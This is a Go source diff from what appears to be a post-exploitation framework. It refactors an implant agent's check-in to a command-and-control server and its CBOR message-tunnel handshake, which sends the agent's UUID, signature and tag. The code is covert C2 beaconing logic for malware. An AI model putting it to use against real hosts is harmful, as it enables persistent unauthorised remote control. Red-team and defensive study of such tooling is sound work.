@@ -25,8 +25,8 @@ import (
 )
 
 // ReportStatus poll CC server and report its system info
-func ReportStatus(info *def.Emp3r0rAgent) (err error) {
-	checkinPath := common.RuntimeConfig.CheckInPath
+func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
+	checkinPath := config.CheckInPath
 	if checkinPath == "" {
 		checkinPath = transport.CheckInAPI
 	}
@@ -101,15 +101,15 @@ func catchInterruptAndExit(cancel context.CancelFunc) {
 // HandShakes record each hello message and C2's reply
 var HandShakes sync.Map // map[string]bool
 
-// MsgTunneler use the connection (CCConn)
-func MsgTunneler(callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) error {
+// MsgTunneler use the connection (conn)
+func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) error {
 	var (
-		in  = cbor.NewDecoder(def.CCMsgConn)
-		out = cbor.NewEncoder(def.CCMsgConn)
+		in  = cbor.NewDecoder(conn)
+		out = cbor.NewEncoder(conn)
 	)
 	go catchInterruptAndExit(cancel)
 	defer func() {
-		if closeErr := def.CCMsgConn.Close(); closeErr != nil {
+		if closeErr := conn.Close(); closeErr != nil {
 			logging.Print("MsgTunneler closing: ", closeErr)
 		}
 
@@ -150,7 +150,7 @@ func MsgTunneler(callback func(*def.MsgTunData), ctx context.Context, cancel con
 		// delete key, forget about this hello when we are done
 		defer HandShakes.Delete(hello_id)
 		// wait until timeout or success
-		for range common.RuntimeConfig.CCTimeout {
+		for range config.CCTimeout {
 			// if hello marked as success, return true
 			isSuccessAny, _ := HandShakes.Load(hello_id)
 			isSuccess, _ := isSuccessAny.(bool)
@@ -170,10 +170,10 @@ func MsgTunneler(callback func(*def.MsgTunData), ctx context.Context, cancel con
 			cnt-- // consume cnt
 
 			// send hello
-			hello_msg.CmdSlice = []string{common.RuntimeConfig.AgentUUID, common.RuntimeConfig.AgentUUIDSig, util.RandStr(util.RandInt(1, 100))}
+			hello_msg.CmdSlice = []string{config.AgentUUID, config.AgentUUIDSig, util.RandStr(util.RandInt(1, 100))}
 			hello_msg.CmdID = uuid.NewString()
-			hello_msg.Tag = common.RuntimeConfig.AgentTag
-			hello_msg.AgentUUID = common.RuntimeConfig.AgentUUID
+			hello_msg.Tag = config.AgentTag
+			hello_msg.AgentUUID = config.AgentUUID
 			if encodeErr := out.Encode(hello_msg); encodeErr != nil {
 				logging.Errorf("agent cannot connect to cc: %v", encodeErr)
 				util.TakeABlink()
